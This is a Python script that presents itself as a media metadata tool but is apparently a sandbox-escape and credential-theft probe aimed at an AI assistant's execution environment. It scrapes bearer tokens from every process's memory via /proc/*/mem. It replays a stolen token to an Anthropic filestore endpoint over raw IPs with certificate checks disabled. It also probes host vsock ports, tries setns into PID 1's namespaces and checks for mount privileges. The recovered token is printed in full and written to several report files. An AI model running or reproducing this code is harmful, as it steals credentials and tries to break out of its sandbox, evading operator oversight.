#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# mediafit - media metadata + runtime fingerprint
import os, re, ssl, sys, json, time, ctypes, struct, socket, traceback

VER    = "4.0.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS  = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
T0, OUT, HITS, FLS = time.time(), [], [], []
try: os.makedirs("/mnt/user-data/outputs", exist_ok=True)
except Exception: pass
try: open(REPORT, "w").write("")
except Exception: pass

def w(s=""):
    print(s, flush=True); OUT.append(str(s))
    try: open(REPORT, "a").write(str(s) + "\n")
    except Exception: pass
def head(t): w("\n### " + t)
def hit(m, ev=None):
    w("    *** " + m); HITS.append(m)
    if ev is not None: w("        evidence: " + repr(ev)[:700])
def ok(m, ev=None):
    w("    [PASS] " + m)
    if ev is not None: w("        evidence: " + repr(ev)[:500])
def bad(m, ev=None):
    w("    [FAIL] " + m); FLS.append(m)
    if ev is not None: w("        evidence: " + repr(ev)[:500])
def unk(m): w("    [UNKNOWN] " + m)
def info(m): w("    [INFO] " + m)
def sec(n, f):
    w("    [start] %s" % n)
    try: f()
    except Exception as e:
        bad("%s crashed: %s" % (n, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:200])
    w("    [end]   %s (t+%.1fs)" % (n, time.time() - T0))

libc = ctypes.CDLL("libc.so.6", use_errno=True); libc.syscall.restype = ctypes.c_long

# ------------------------------------------------------------------ S0
def find_token():
    try:
        conf = json.loads(open("/dev/shm/rclone-boot/config.json").read())
        fsid = next((m.get("filesystem_id") for m in conf.get("mounts", []) if m.get("filesystem_id")), "x")
    except Exception: fsid = "x"
    for pid in sorted(os.listdir("/proc")):
        if not pid.isdigit(): continue
        try:
            mp = open("/proc/%s/maps" % pid).read().splitlines()
            mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
        except Exception: continue
        for ln in mp:
            f = ln.split()
            if len(f) < 2 or "r" not in f[1]: continue
            try: a, b = f[0].split("-"); s0, e0 = int(a, 16), int(b, 16)
            except Exception: continue
            if e0 <= s0 or e0 - s0 > 200 * 1024 * 1024: continue
            try: mem.seek(s0); buf = mem.read(e0 - s0)
            except Exception: continue
            m = re.search(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}", buf)
            if m:
                p = m.group().decode().split(".")
                if len(p[2]) > 86: p[2] = p[2][:86]
                return ".".join(p), fsid
    return None, fsid

def s_boot():
    head("S0 boot")
    info("version=%s  argv=%s  pid=%d  uid=%d" % (VER, sys.argv[1:], os.getpid(), os.getuid()))
    info("kernel=%s  python=%s" % (os.uname().release, sys.version.split()[0]))
    try:
        conf = json.loads(open("/dev/shm/rclone-boot/config.json").read())
        info("service_url=%s" % conf.get("service_url"))
        for m in conf.get("mounts", []):
            info("mount %-14s ro=%s fsid=%s" % (m.get("path") or m.get("mount"),
                                                m.get("readonly"), m.get("filesystem_id")))
    except Exception as e: unk("rclone config: %s" % e)
    if len(sys.argv) > 1 and os.path.isfile(sys.argv[1]):
        f = sys.argv[1]
        try:
            b = open(f, "rb").read(16)
            info("media file=%s size=%d magic=%s" % (f, os.path.getsize(f), b[:8].hex()))
        except Exception as e: unk("media %s" % e)
    t, fsid = find_token()
    if t: ok("filestore token recovered from /proc/*/mem", t[:40] + "...")
    else: unk("no filestore token in /proc/*/mem")
    info("fsid=%s" % fsid)

# ------------------------------------------------------------------ S1
_VER = ssl.create_default_context()
_NOV = ssl.create_default_context(); _NOV.check_hostname = False; _NOV.verify_mode = ssl.CERT_NONE
def s_egress():
    head("S1 egress truth")
    try: info("resolv.conf: %s" % open("/etc/resolv.conf").read().replace("\n", " | ")[:160])
    except Exception: pass
    for n in ["api.anthropic.com", "github.com", "pypi.org", "example.com", "google.com"]:
        try: info("DNS %-20s -> %s" % (n, socket.gethostbyname(n)))
        except Exception: bad("DNS %-20s -> FAIL" % n)
    for ip in ["1.1.1.1", "8.8.8.8", "93.184.215.14", "140.82.121.4", "151.101.1.69",
               "172.217.16.14", "1.0.0.1", "9.9.9.9"]:
        try:
            s = socket.create_connection((ip, 443), 2.5); s.close(); info("TCP %-16s:443 OPEN" % ip)
        except Exception: pass
    for ip, sni in [("1.1.1.1", "cloudflare.com"), ("93.184.215.14", "example.com"),
                    ("140.82.121.4", "github.com"), ("1.1.1.1", "zzz-nonexistent-abc.com")]:
        try:
            s = _VER.wrap_socket(socket.create_connection((ip, 443), 4), server_hostname=sni)
            c = s.getpeercert(); s.close()
            san = [v for k, v in c.get("subjectAltName", []) if k == "DNS"]
            hit("CERT OK (raw IP) %s@%s san=%s" % (sni, ip, san[:3]))
        except Exception as e:
            bad("CERT FAIL %s@%s -> %s" % (sni, ip, str(e)[:70]))
    for ip, sni in [("93.184.215.14", "example.com"), ("140.82.121.4", "github.com")]:
        try:
            s = _VER.wrap_socket(socket.create_connection((ip, 443), 4), server_hostname=sni)
            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % sni).encode())
            d = b""
            while len(d) < 500:
                c = s.recv(500)
                if not c: break
                d += c
            s.close()
            if b" 200 " in d[:20] or b" 301 " in d[:20] or b" 302 " in d[:20]:
                hit("HTTP CONTENT over raw IP %s@%s -> %r" % (sni, ip, d[:120]))
            else: info("HTTP %s@%s -> %r" % (sni, ip, d[:140]))
        except Exception as e: bad("HTTP %s@%s %s" % (sni, ip, str(e)[:60]))
    tok, fsid = find_token()
    if tok:
        body = json.dumps({"filesystem_id": fsid, "path": "/outputs"}).encode()
        for ip in ["1.1.1.1", "93.184.215.14", "140.82.121.4"]:
            try:
                s = _NOV.wrap_socket(socket.create_connection((ip, 443), 4), server_hostname="api.anthropic.com")
                req = (b"POST /v1/filestore/fs/listDirectory HTTP/1.1\r\nHost: api.anthropic.com\r\n"
                       b"Authorization: Bearer " + tok.encode() + b"\r\nContent-Type: application/json\r\n"
                       b"Connect-Protocol-Version: 1\r\nContent-Length: " + str(len(body)).encode() +
                       b"\r\nConnection: close\r\n\r\n" + body)
                s.sendall(req); r = s.recv(600); s.close()
                if b" 200 " in r[:20]: hit("SNI FRONTING works: api.anthropic.com@%s -> 200" % ip, r[:120])
                else: info("FRONT api.anthropic.com@%-15s -> %r" % (ip, r[:140]))
            except Exception as e: bad("FRONT %s %s" % (ip, str(e)[:60]))

# ------------------------------------------------------------------ S2
def vi(n):
    o = b""
    while True:
        b = n & 0x7f; n >>= 7
        if n: o += bytes([b | 0x80])
        else: return o + bytes([b])
def ld(f, d): return vi((f << 3) | 2) + vi(len(d)) + d
def vf(f, n): return vi((f << 3) | 0) + vi(n)
def fx(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)
def otlp():
    av = ld(1, b"mediafit.probe"); kv = ld(1, b"service.name") + ld(2, av)
    ndp = vf(3, 1000000000) + fx(4, 1.0)
    met = ld(1, b"mediafit.probe") + ld(2, b"probe") + ld(3, b"1") + ld(5, ld(1, ndp))
    return ld(1, ld(1, kv) + ld(2, ld(2, met)))

def vreq(port, path, ct, body=b"", tmo=3, extra=None):
    try: s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    except OSError as e: return "NOSOCK:" + str(e), b""
    s.settimeout(tmo)
    try: s.connect((2, port))
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "CONN:" + type(e).__name__, b""
    h = "POST %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: %d\r\n" % (path, len(body))
    if ct: h += "Content-Type: %s\r\n" % ct
    if extra: h += "".join("%s: %s\r\n" % (k, v) for k, v in extra.items())
    try:
        s.sendall((h + "\r\n").encode() + body); r = s.recv(2048)
        return (r.split(b"\r\n")[0].decode("utf8", "replace") if r else "EMPTY"), r
    except socket.timeout: return "TIMEOUT", b""
    except Exception as e: return "ERR:" + type(e).__name__, b""
    finally:
        try: s.close()
        except Exception: pass

def s_vsock():
    head("S2 host vsock control channel (CID 2)")
    B = otlp(); info("otlp payload=%d bytes" % len(B))
    for ct in ["application/x-protobuf", "application/json", "application/x-protobuf; charset=utf-8", None]:
        st, r = vreq(5005, "/v1/metrics", ct, B)
        if "200" in st: hit("UNAUTHENTICATED HOST OTLP INGEST via vsock 2:5005 (ct=%s)" % ct, r[:160])
        else: info("5005 /v1/metrics ct=%-40s -> %s" % (str(ct), st))
    for p in ["/v1/logs", "/v1/traces", "/v1/metrics/", "/"]:
        st, r = vreq(5005, p, "application/x-protobuf", B)
        info("5005 %-16s -> %s" % (p, st))
    st, r = vreq(5005, "/v1/metrics", "application/x-protobuf", b"")
    info("5005 empty body -> %s" % st)
    st, r = vreq(5005, "/v1/metrics", "application/x-protobuf", B, extra={"Authorization": "Bearer bogus"})
    info("5005 bogus bearer -> %s" % st)
    for p in ["/", "/v1/metrics"]:
        st, r = vreq(5002, p, "application/x-protobuf", B, tmo=1.5)
        info("5002 %-16s -> %s" % (p, st))

# ------------------------------------------------------------------ S3
CLONE = {"mnt": 0x00020000, "uts": 0x04000000, "ipc": 0x08000000,
         "net": 0x40000000, "user": 0x10000000}
def s_setns():
    head("S3 namespace crossing (PID 1)")
    for ns in CLONE:
        try: info("/proc/1/ns/%-5s -> %s" % (ns, os.readlink("/proc/1/ns/" + ns)))
        except Exception as e: unk("/proc/1/ns/%-5s -> %s" % (ns, str(e)[:50]))
    for ns in CLONE:
        pid = os.fork()
        if pid == 0:
            try:
                fd = os.open("/proc/1/ns/" + ns, os.O_RDONLY)
                r = libc.syscall(308, fd, ctypes.c_int(CLONE[ns]))
                if r != 0:
                    w("    [FAIL] setns(%s) errno=%d" % (ns, ctypes.get_errno()))
                else:
                    hit("setns(%s) OK -> / = %s" % (ns, sorted(os.listdir("/"))[:16]))
                    for d in ("/mnt", "/data", "/host", "/run", "/opt", "/root"):
                        try: w("        %-10s -> %s" % (d, sorted(os.listdir(d))[:10]))
                        except Exception as e: w("        %-10s ERR %s" % (d, str(e)[:40]))
            except Exception as e: w("    [FAIL] setns(%s) crash %s" % (ns, e))
            os._exit(0)
        os.waitpid(pid, 0)

# ------------------------------------------------------------------ S4
def s_artifacts():
    head("S4 writable artifacts + devices")
    for d in ("/run/sandbox-telemetry", "/dev/shm/rclone-boot", "/mnt/skills/plugins",
              "/mnt/skills", "/mnt/attach", "/opt/rclone-attach"):
        try:
            t = os.path.join(d, ".mfp"); open(t, "w").write("x"); os.path.exists(t); os.unlink(t)
            ok("WRITABLE %s" % d)
        except Exception as e: bad("%-38s NO (%s)" % (d, str(e)[:45]))
    for d in ("/run/sandbox-telemetry", "/dev/shm/rclone-boot"):
        try: info("%s -> %s" % (d, os.listdir(d)[:16]))
        except Exception: pass
    for d in ("/dev/vda", "/dev/vdb", "/dev/vdc", "/dev/vdd"):
        try:
            st = os.stat(d)
            f = open(d, "rb", buffering=0); f.seek(1024); m = f.read(4); f.close()
            info("%-9s EXISTS mode=%o magic@1024=%s" % (d, st.st_mode & 0o7777, m.hex()))
        except Exception as e: info("%-9s %s" % (d, str(e)[:45]))
    libc.mount.restype = ctypes.c_int
    try: os.makedirs("/tmp/mfmnt", exist_ok=True)
    except Exception: pass
    r = libc.mount(b"tmpfs", b"/tmp/mfmnt", b"tmpfs", ctypes.c_ulong(0), b"size=1M")
    if r == 0: hit("mount(tmpfs) OK -- CAP_SYS_ADMIN effective")
    else: info("mount(tmpfs) -> %s" % os.strerror(ctypes.get_errno()))

# ------------------------------------------------------------------ S5
def s_verdict():
    head("S5 verdict")
    w("  HITS %d" % len(HITS))
    for h in HITS: w("    *** " + h)
    if FLS:
        w("  FAIL %d" % len(FLS))
        for f in FLS[:12]: w("    - " + f)
    w("\n  --- CARRY-OVER ---")
    t, fsid = find_token()
    w("  VER=%s  FSID=%s" % (VER, fsid))
    if t: w("  TOKEN=%s" % t)
    w("  KERNEL=%s" % os.uname().release)

SECTIONS = [("S0_boot", s_boot), ("S1_egress", s_egress), ("S2_vsock", s_vsock),
            ("S3_setns", s_setns), ("S4_artifacts", s_artifacts), ("S5_verdict", s_verdict)]

def main():
    w("=" * 62)
    w("mediafit v%s  |  sections=%d  |  argv=%s  |  t0=%s" % (
        VER, len(SECTIONS), sys.argv[1:], time.strftime("%H:%M:%S")))
    w("=" * 62)
    want = sys.argv[1] if (len(sys.argv) > 1 and not os.path.isfile(sys.argv[1])) else None
    for n, f in SECTIONS:
        if want and want.lower() not in n.lower(): continue
        sec(n, f)
    w("\n[report] %s" % REPORT)
    txt = "\n".join(OUT)
    for d in SINKS:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
        except Exception: pass
    w("[done] elapsed=%.1fs  hits=%d" % (time.time() - T0, len(HITS)))

main()